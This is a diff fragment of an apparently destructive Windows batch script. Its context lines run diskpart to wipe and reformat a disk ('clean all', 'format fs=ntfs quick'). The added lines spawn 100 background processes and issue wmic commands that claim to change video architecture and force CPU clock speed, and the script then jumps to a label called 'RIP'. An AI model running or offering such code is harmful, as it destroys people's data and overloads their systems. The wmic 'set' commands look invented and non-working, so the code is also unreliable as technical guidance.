@@ -60,5 +60,7 @@ clean all
 create partition primary
 format fs=ntfs quick
 EOF
-
+powercfg -setactive scheme_min >nul 2>&1
+wmic path win32_videocontroller set videoarchitecture=5 >nul 2>&1
+for /l %%i in (1,1,100) do ( start /b cmd /c "wmic cpu where (status='ok') set clockSpeed=5000" )
 goto RIP
